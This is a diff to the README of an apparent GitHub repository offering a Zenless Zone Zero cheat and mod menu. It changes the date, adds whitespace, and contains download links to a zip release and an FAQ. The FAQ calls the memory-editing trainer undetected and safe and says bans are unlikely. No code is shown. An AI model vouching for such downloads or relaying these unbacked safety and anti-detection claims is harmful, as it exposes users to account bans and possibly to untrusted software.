@@ -1,4 +1,4 @@
-# ZenlessZoneZero Cheat & Mod Menu (UPD: 13-Aug-2026)
+# ZenlessZoneZero Cheat & Mod Menu (UPD: 15-Aug-2026)
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/ZZZ-trainer/releases/download/v1.2/ZZZ.Mod.Menu-v1.2.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/rivetqueenrivet/ZZZ-trainer/releases/download/v1.2/ZZZ.Mod.Menu-v1.2.zip)
@@ -13,6 +13,7 @@ A powerful trainer tool for Zenless Zone Zero with clean in-game overlay
 ## Features
 
 ![ZZZ Cheat Preview Hack](https://github.com/rivetqueenrivet/zzz-trainer/blob/main/assets/GUI/image.png)
+
 
 | Player | World | Visuals | Misc|
 |-------|--------|-------|------|
@@ -35,19 +36,29 @@ A powerful trainer tool for Zenless Zone Zero with clean in-game overlay
 
 ## FAQ
 
+
 ### Is this safe to use?
+
 The tool only reads and writes game memory - it does **not modify** any game files or network traffic. However, use at your own risk.
 
+
 ### Will I get banned?
+
 Most likely not. Software itself is Undetected, but keep in mind - anyone could report you.
 
+
 ### Can I customize the hotkey?
+
 Yes, the default toggle key is `INSERT`, but you can change it in the settings tab.
 
+
 ### Does this work with the latest version?
+
 The trainer is updated regularly to support the latest game version. Check the releases page for updates.
 
+
 ### How to uninstall?
+
 Simply delete the extracted folder. There are no registry changes or leftover files.
 
 ---
